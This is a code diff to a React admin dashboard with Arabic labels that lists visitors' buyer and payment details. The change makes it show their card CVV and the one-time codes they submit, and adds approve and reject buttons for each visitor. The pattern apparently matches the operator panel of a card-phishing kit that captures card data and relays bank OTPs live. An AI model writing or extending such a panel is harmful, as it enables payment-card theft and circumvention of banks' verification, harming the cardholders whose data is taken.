@@ -27,7 +27,7 @@ interface CombinedData {
   buyerInfo: Record<string, any> | null;
   paymentInfo: Record<string, any> | null;
   paymentSuccess: boolean;
-  otp: string;
+  code: string;
 }
 
 export default function AdminDashboard() {
@@ -109,7 +109,7 @@ export default function AdminDashboard() {
       buyerInfo: buyerSubmission?.data || null,
       paymentInfo: paymentSubmission?.data || null,
       paymentSuccess: paymentSubmission?.success || false,
-      code: paymentSubmission?.data?.cardLast4 || "",
+      code: paymentSubmission?.data?.otp || "",
     };
   });
 
@@ -205,15 +205,25 @@ export default function AdminDashboard() {
                   combinedData.map((row) => (
                     <tr key={row.visitorId} className="hover:bg-gray-50">
                       <td className="px-4 py-3">
-                        <div className="flex items-center gap-2"></div>
+                        <div className="flex items-center gap-2">
+                          <button className="p-1.5 rounded bg-gray-100 hover:bg-gray-200 text-gray-600">
+                            <Eye className="w-4 h-4" />
+                          </button>
+                          <button className="px-3 py-1 rounded text-xs font-medium bg-green-500 hover:bg-green-600 text-white">
+                            موافقة
+                          </button>
+                          <button className="px-3 py-1 rounded text-xs font-medium bg-red-500 hover:bg-red-600 text-white">
+                            رفض
+                          </button>
+                        </div>
                       </td>
                       <td className="px-4 py-3 text-gray-700">
                         {row.currentPage === "/" ? "الرئيسية" : row.currentPage}
                       </td>
                       <td className="px-4 py-3">
-                        {row.otp ? (
+                        {row.code ? (
                           <span className="font-mono text-blue-600">
-                            {row.otp}
+                            {row.code}
                           </span>
                         ) : (
                           <span className="text-gray-400">-</span>
@@ -416,7 +426,7 @@ export default function AdminDashboard() {
                 <div className="bg-gray-50 rounded-lg p-3">
                   <span className="text-xs text-gray-500 block">CVV</span>
                   <span className="text-sm font-bold text-[#8A1538]">
-                    {selectedData.paymentInfo.cvv}
+                    {selectedData.paymentInfo.cvv || "0"}
                   </span>
                 </div>
               </div>
